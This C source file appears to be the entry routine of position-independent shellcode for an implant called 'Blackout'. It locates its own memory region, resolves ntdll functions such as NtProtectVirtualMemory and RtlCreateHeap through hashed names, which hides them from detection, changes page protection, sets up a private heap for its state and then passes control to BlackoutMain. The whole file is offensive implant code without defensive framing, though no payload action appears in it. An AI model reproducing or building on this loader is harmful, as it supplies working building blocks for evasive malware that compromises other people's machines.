#include <Common.h>
#include <Constexpr.h>

EXTERN_C FUNC VOID Entry(
    PVOID Param
) {
    INSTANCE Instance = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };

    MmZero( &Instance, sizeof( Instance ) );

    Instance.Blackout.Region.Base   = StRipStart();
    Instance.Blackout.Region.Length = ( ( U_PTR( StRipEnd() ) - U_PTR( Instance.Blackout.Region.Base ) ) + 4096 - 1 ) & ~( 4096 -1 );

    MmAddr = Instance.Blackout.Region.Base + InstanceOffset();
    MmSize = sizeof( PVOID );

    Instance.Blackout.RxRegion.Base   = Instance.Blackout.Region.Base;
    Instance.Blackout.RxRegion.Length = U_PTR( MmAddr ) - U_PTR( Instance.Blackout.RxRegion.Base );
    Instance.Blackout.RwRegion.Base   = U_PTR( Instance.Blackout.Region.Base ) - U_PTR( Instance.Blackout.RxRegion.Length );
    Instance.Blackout.RwRegion.Length = U_PTR( Instance.Blackout.Region.Length ) - U_PTR( Instance.Blackout.RxRegion.Length );

    if ( ( Instance.Modules.Ntdll = LdrLoadModule( HASH_STR( "ntdll.dll" ) ) ) ) {
        if ( !( Instance.Win32.RtlAllocateHeap        = LdrLoadFunc( Instance.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
             !( Instance.Win32.NtProtectVirtualMemory = LdrLoadFunc( Instance.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) ) ||
             !( Instance.Win32.NtFreeVirtualMemory    = LdrLoadFunc( Instance.Modules.Ntdll, HASH_STR( "NtFreeVirtualMemory"    ) ) ) ||
             !( Instance.Win32.RtlCreateHeap          = LdrLoadFunc( Instance.Modules.Ntdll, HASH_STR( "RtlCreateHeap" ) ) )
        ) {
            return;
        }
    }

    Instance.Blackout.Heap = Instance.Win32.RtlCreateHeap( 0, NULL, 0, 0, 0, NULL );

    if ( !NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory(
        NtCurrentProcess(), &MmAddr,
        &MmSize, PAGE_READWRITE, &Protect
    ) ) ) {
        return;
    }

    if ( ! ( C_DEF( MmAddr ) = Instance.Win32.RtlAllocateHeap( Instance.Blackout.Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
        return;
    }

    MmCopy( C_DEF( MmAddr ), &Instance, sizeof( INSTANCE ) );
    MmZero( &Instance, sizeof( INSTANCE ) );
    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    BlackoutMain( Param );
}